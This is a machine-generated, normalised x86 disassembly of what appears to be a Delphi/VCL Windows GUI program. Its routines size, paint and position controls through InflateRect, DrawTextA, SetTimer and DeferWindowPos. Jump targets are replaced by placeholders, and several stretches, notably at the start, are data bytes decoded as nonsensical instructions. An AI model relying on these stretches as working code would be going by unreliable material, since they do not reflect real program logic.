add [ eax + 0x4f070024 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
inc ebp
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah al
stc
inc edx
add al ah
push esi
inc ebp
add [ eax ] bl
add [ ebx ] al
dec eax
pop ebx
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
popad
insb
call 0x384324d0
add [ eax ] al
[ eax + 0x10042f9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42e3dc72
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al dh
test [ edx ] 0xffef0001
mov al 0xf9
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe30c9072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e2c872
add [ eax + 0x74 ] ch
inc ecx
add [ 0x78450800 ] al
je r-xdata
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
push ds
add [ eax ] al
jecxz r-xdata
add [ eax ] al
add bh bh
js r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
inc edx
add ah dl
sbb eax 0x1edc0042
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
loop r-xdata
lea eax [ bx + si ]
enter 0x42e2 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xe3
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x10042f9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
sub_42eee4
enter 0x452a 0x0
or [ eax * 2 + 0x454ee800 ] cl
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax - 0x43ffbab1 ] cl
cmp [ eax + eax - 0x4c ] eax
pop ss
inc ebp
add [ ebp + 0x45 ] dl
add [ eax ] bl
cmp al [ eax + eax + 0x3c ]
and al [ ebp ]
insb
and [ ebp ] al
in al dx
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax ] ch
outsb
inc ebp
add [ edx + 0x4d440045 ] bh
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ eax ] ch
cmp al [ eax + eax + 0x8 ]
or [ ebx ] eax
add eax 0xeb00c00
mov al 0x5
add ch bh
push [ esi + 0x4308a0ff ]
add al ah
or [ ebx ] al
hlt
sub_42f060
enter 0x452a 0x0
or [ eax * 2 + 0x454ee800 ] cl
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax - 0x43ffbab1 ] cl
cmp [ eax + eax - 0x4c ] eax
pop ss
inc ebp
add [ ebp + 0x45 ] dl
add [ eax ] bl
cmp al [ eax + eax + 0x3c ]
and al [ ebp ]
insb
and [ ebp ] al
in al dx
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax ] ch
outsb
inc ebp
add [ edx + 0x4d440045 ] bh
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ eax ] ch
cmp al [ eax + eax + 0x8 ]
or [ ebx ] eax
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
int3
sub_42f5f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424fec
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_425774
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424fec
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_425774
pop ebx
mov esp ebp
pop ebp
retn
sub_42f6bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_4250f8
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42f5f8
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42f71c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4562fc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x69
mov eax esi
call sub_44e070
mov edx 0x69
mov eax esi
call sub_44e094
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f77c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4259ec
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4252cc
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x16a ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov dl 0x1
mov eax [ esi + 0x10 ]
call sub_4250c8
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4253e8
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_4257ac
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
sub_42f7f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42f878
call sub_422bc8
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f840
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42f8ec
mov eax [ esi + 0x34 ]
call sub_422c7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42f878
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42f8b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f8ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42f96b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f972
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_42f9c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456d7c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
add esp 0xfffffff0
call sub_403668
mov edx 0xb9
mov eax esi
call sub_44e070
mov edx 0x29
mov eax esi
call sub_44e094
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42fe14
mov edx 0x1
mov eax esi
call sub_42fe30
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_44ea54
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_455348
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42fa88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451f40
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42faf8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4546cc
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_452654
sub_42fb38
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fc28
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44e8b4
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_453590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc2f
lea eax [ ebp - 0x14 ]
call sub_404118
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4550b4
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4550b4
push eax
call InvalidateRect
sub_42fc38
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42fc70
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42fdd2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42f6bc
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42fc38
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42f6bc
mov esi [ ebx + 0x208 ]
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
push ebp
call sub_42fc38
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42f6bc
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4252cc
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_425670
mov eax ebx
call sub_4562b4
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_450bac
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x1c ]
call sub_4045d8
push eax
mov eax esi
call sub_425acc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fdd9
lea eax [ ebp - 0x1c ]
call sub_404118
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4253e8
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_4259ec
mov edx r-xdata
mov eax esi
call sub_425948
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42fe84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451120
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42fedc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453d48
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42fffd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453d48
call sub_403b7c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44e094
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44e070
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_430018
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_455bfc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_430044
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4562bc
pop esi
pop ebx
retn
sub_430084
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les eax [ ecx ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x1b00043 ] bl
inc ebx
add [ edx + eax ] bl
add [ eax ] al
pushfd
sbb eax [ eax + eax - 0x14 ]
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edx + eax + 0x43 ] ch
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_4301e8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_445c80
mov edx edi
mov eax [ esi + 0x210 ]
call sub_418b9c
xor edx edx
mov eax edi
call sub_44e7d4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_44ea28
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_430618
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43026c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_418e94
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4302a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_430309
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445f80
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_43030e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430334
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_454098
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403518
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_430374
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_453ee0
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403518
pop edx
pop esi
pop ebx
retn
sub_4303a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_443960
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_430650
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_430430
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4306c4
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_40331c
mov eax [ esi + 0x210 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_456dd8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_430480
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_424b14
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_430609
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4550b4
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_44e7d4
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_44e2b8
